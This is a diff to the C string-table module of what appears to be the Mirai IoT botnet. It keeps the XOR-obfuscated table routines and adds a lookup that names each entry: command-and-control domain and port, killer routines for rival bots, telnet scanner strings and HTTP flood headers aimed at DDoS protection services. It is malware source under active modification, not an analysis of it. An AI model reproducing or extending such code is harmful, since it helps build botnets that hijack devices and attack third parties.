@@ -1,8 +1,6 @@
 #define _GNU_SOURCE
 
-#ifdef DEBUG
 #include <stdio.h>
-#endif
 #include <stdint.h>
 #include <stdlib.h>
 
@@ -12,6 +10,7 @@
 
 uint32_t table_key = 0xdeadbeef;
 struct table_value table[TABLE_MAX_KEYS];
+struct table_id_ref table_ref[TABLE_MAX_KEYS];
 
 void table_init(void)
 {
@@ -116,9 +115,9 @@ char *table_retrieve_val(int id, int *len)
         return NULL;
     }
 #endif
-
-    if (len != NULL)
+    if (len != NULL){
         *len = (int)val->val_len;
+    }
     return val->val;
 }
 
@@ -151,8 +150,68 @@ static void toggle_obf(uint8_t id)
         val->val[i] ^= k3;
         val->val[i] ^= k4;
     }
-
 #ifdef DEBUG
     val->locked = !val->locked;
 #endif
+}
+
+
+void table_ref_init(){
+	table_ref[0].id = "NULL";
+	table_ref[1].id = "TABLE_PROCESS_ARGV";
+	table_ref[2].id = "TABLE_EXEC_SUCCESS";
+	table_ref[3].id = "TABLE_CNC_DOMAIN";
+	table_ref[4].id = "TABLE_CNC_PORT";
+	table_ref[5].id = "TABLE_KILLER_SAFE";
+	table_ref[6].id = "TABLE_KILLER_PROC";
+	table_ref[7].id = "TABLE_KILLER_EXE";
+	table_ref[8].id = "TABLE_KILLER_DELETED";
+	table_ref[9].id = "TABLE_KILLER_FD";
+	table_ref[10].id = "TABLE_KILLER_ANIME";
+	table_ref[11].id = "TABLE_KILLER_STATUS";
+	table_ref[12].id = "TABLE_MEM_QBOT";
+	table_ref[13].id = "TABLE_MEM_QBOT2";
+	table_ref[14].id = "TABLE_MEM_QBOT3";
+	table_ref[15].id = "TABLE_MEM_UPX";
+	table_ref[16].id = "TABLE_MEM_ZOLLARD";
+	table_ref[17].id = "TABLE_MEM_REMAITEN";
+	table_ref[18].id = "TABLE_SCAN_CB_DOMAIN";
+	table_ref[19].id = "TABLE_SCAN_CB_PORT";
+	table_ref[20].id = "TABLE_SCAN_SHELL";
+	table_ref[21].id = "TABLE_SCAN_ENABLE";
+	table_ref[22].id = "TABLE_SCAN_SYSTEM";
+	table_ref[23].id = "TABLE_SCAN_SH";
+	table_ref[24].id = "TABLE_SCAN_QUERY";
+	table_ref[25].id = "TABLE_SCAN_RESP";
+	table_ref[26].id = "TABLE_SCAN_NCORRECT";
+	table_ref[27].id = "TABLE_SCAN_PS";
+	table_ref[28].id = "TABLE_SCAN_KILL_9";
+	table_ref[29].id = "TABLE_ATK_VSE";
+	table_ref[30].id = "TABLE_ATK_RESOLVER";
+	table_ref[31].id = "TABLE_ATK_NSERV";
+	table_ref[32].id = "TABLE_ATK_KEEP_ALIVE";
+	table_ref[33].id = "TABLE_ATK_ACCEPT";
+	table_ref[34].id = "TABLE_ATK_ACCEPT_LNG";
+	table_ref[35].id = "TABLE_ATK_CONTENT_TYPE";
+	table_ref[36].id = "TABLE_ATK_SET_COOKIE";
+	table_ref[37].id = "TABLE_ATK_REFRESH_HDR";
+	table_ref[38].id = "TABLE_ATK_LOCATION_HDR";
+	table_ref[39].id = "TABLE_ATK_SET_COOKIE_HDR";
+	table_ref[40].id = "TABLE_ATK_CONTENT_LENGTH_HDR";
+	table_ref[41].id = "TABLE_ATK_TRANSFER_ENCODING_HDR";
+	table_ref[42].id = "TABLE_ATK_CHUNKED";
+	table_ref[43].id = "TABLE_ATK_KEEP_ALIVE_HDR";
+	table_ref[44].id = "TABLE_ATK_CONNECTION_HDR";
+	table_ref[45].id = "TABLE_ATK_DOSARREST";
+	table_ref[46].id = "TABLE_ATK_CLOUDFLARE_NGINX";
+	table_ref[47].id = "TABLE_HTTP_ONE";
+	table_ref[48].id = "TABLE_HTTP_TWO";
+	table_ref[49].id = "TABLE_HTTP_THREE";
+	table_ref[50].id = "TABLE_HTTP_FOUR";
+	table_ref[51].id = "TABLE_HTTP_FIVE";
+}
+
+char *table_ref_retrieve_val(int ref){
+	return table_ref[ref].id;
+
 }
